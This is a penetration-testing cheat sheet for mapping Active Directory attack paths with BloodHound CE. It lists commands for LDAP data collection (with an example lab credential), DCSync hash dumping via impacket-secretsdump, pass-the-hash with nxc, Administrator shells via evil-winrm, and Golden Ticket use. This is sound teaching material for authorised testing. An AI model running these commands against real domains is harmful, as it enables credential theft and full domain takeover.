BloodHound - AD Attack Path Mapping - Cheat Sheet

Collect Active Directory data with bloodhound-ce-python, ingest it into
BloodHound CE, then use the graph to find the shortest attack path to Domain
Admin. BloodHound maps AD relationships (membership, ACLs, sessions,
delegation) as a graph, exposing paths invisible in a flat user list.
Replace the placeholders (<...>) with your own values.


Step 1 - Start BloodHound (Kali)

BloodHound CE runs on Docker (three containers: app-db, graph-db, bloodhound):

    ./bloodhound-cli up          # start all containers
    ./bloodhound-cli running     # verify 3 containers are up

Open http://127.0.0.1:8080 and log in with admin / the password shown at first
install (printed once during setup - store it, it won't be shown again).


Step 2 - Collect domain data -> get the ZIP

The collector (bloodhound-ce-python) runs from Kali and talks to the DC over
LDAP to pull users, groups, ACLs, sessions, GPOs, and trusts. LDAP requires
auth, so you need at least one valid domain account (any low-priv user works):

    bloodhound-ce-python --zip -c All \
        -d <domain> \
        -u <username> \
        -p '<password>' \
        -dc <dc-hostname> \
        -ns <dc-ip>

    # Example:
    bloodhound-ce-python --zip -c All -d force.local -u leia.o -p '#1Loved' \
        -dc dc-01.force.local -ns 192.168.50.10

This produces a .zip in the current folder containing the raw AD data.
  -c All     = collect everything
  -c DCOnly  = faster, quieter; skips session + local-admin data


Step 3 - Ingest the ZIP into the BloodHound UI

    Administration -> File Ingest -> Upload File(s) -> select the .zip ->
    wait for status "Ingesting" -> done.   (or use Quick Upload from the sidebar)

SharpHound (Windows collector) and AzureHound produce the same zip format.


Step 4 - Explore the graph (key features)

  - Search        : find a specific user/computer/group by name.
  - Pathfinding   : set a source node + target -> shortest attack path.
  - Mark as Owned : right-click a compromised node -> Mark as Owned (skull),
                    then Pathfind from it to Domain Admin.
  - High Value Targets (HVT): diamond-icon nodes (Domain Admins, DCs, krbtgt).
  - Cypher -> Saved Queries (most useful):
        Paths from Domain Users to Tier Zero / High Value Targets
        Principals with DCSync privileges
        Computers where Domain Users are local administrators
        Computers where Domain Users can read LAPS passwords
        Workstations / Servers where Domain Users can RDP
        Domain Admin logons to non-Domain Controllers
        Dangerous privileges for Domain User groups


Step 5 - DCSync (if BloodHound shows replication rights)

DCSync: an account with DS-Replication-Get-Changes-All (normally only DCs)
impersonates a DC and asks the real DC to replicate password hashes for all
accounts - including Administrator and krbtgt - without logging into the DC.
Find it in BloodHound via "Principals with DCSync privileges" (the
GetChangesAll edge to the domain object). One such account = full domain
compromise.

    impacket-secretsdump <domain>/<username>:<password>@<dc-ip>

    # Or pass-the-hash:
    impacket-secretsdump -hashes <lmhash>:<nthash> <domain>/<username>@<dc-ip>


Step 6 - After compromise - use the hashes

    # Pass-the-Hash as Administrator
    nxc smb <target-ip> -u Administrator -H <nt-hash>

    # Interactive shell
    evil-winrm -i <target-ip> -u Administrator -H <nt-hash>

Use the Administrator hash for PtH or the krbtgt hash for a Golden Ticket.


Key idea: BloodHound maps relationships in AD as a graph - membership, ACLs,
sessions, delegation. Attack paths that are invisible in a flat user list
become obvious as edges. The goal is always the shortest path from any owned
node to a High Value Target, then exploit whatever edges BloodHound shows along
the way.
